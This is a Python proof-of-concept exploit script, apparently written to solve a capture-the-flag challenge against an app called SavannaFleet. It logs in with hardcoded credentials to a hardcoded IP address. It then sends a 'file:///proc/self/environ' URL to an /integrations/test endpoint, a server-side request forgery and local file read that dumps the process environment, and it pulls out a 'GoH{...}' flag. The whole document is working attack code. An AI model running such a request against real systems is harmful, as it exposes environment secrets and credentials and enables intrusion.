#!/usr/bin/env python3
import argparse
import re
import sys

import requests


def login(session: requests.Session, base_url: str, email: str, password: str, timeout: int) -> None:
    resp = session.post(
        f"{base_url}/login",
        data={"email": email, "password": password},
        timeout=timeout,
        allow_redirects=True,
    )
    if resp.status_code not in (200, 302):
        raise RuntimeError(f"Login failed with HTTP {resp.status_code}")


def fetch_environ(session: requests.Session, base_url: str, timeout: int) -> str:
    resp = session.post(
        f"{base_url}/integrations/test",
        json={"url": "file:///proc/self/environ"},
        timeout=timeout,
    )
    if resp.status_code != 200:
        raise RuntimeError(f"Unexpected HTTP status: {resp.status_code}")

    data = resp.json()
    if not data.get("success"):
        raise RuntimeError(f"Endpoint returned error: {data.get('error', 'unknown error')}")

    return data.get("response", "")


def extract_flag(content: str) -> str:
    match = re.search(r"GoH\{[^}]+\}", content)
    if not match:
        raise RuntimeError("Flag pattern not found in response")
    return match.group(0)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="PoC: SavannaFleet SSRF/LFI via /integrations/test"
    )
    parser.add_argument(
        "--url",
        default="http://209.38.92.205:33139/",
        help="Target base URL (default: %(default)s)",
    )
    parser.add_argument(
        "--email",
        default="otieno@savannafuels.co.ke",
        help="Login email (default: %(default)s)",
    )
    parser.add_argument(
        "--password",
        default="Otieno2024",
        help="Login password (default: %(default)s)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="HTTP timeout in seconds (default: %(default)s)",
    )
    args = parser.parse_args()

    session = requests.Session()

    try:
        base_url = args.url.rstrip("/")
        login(session, base_url, args.email, args.password, args.timeout)
        environ_data = fetch_environ(session, base_url, args.timeout)
        flag = extract_flag(environ_data)
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        return 1

    print(f"[+] Flag found: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
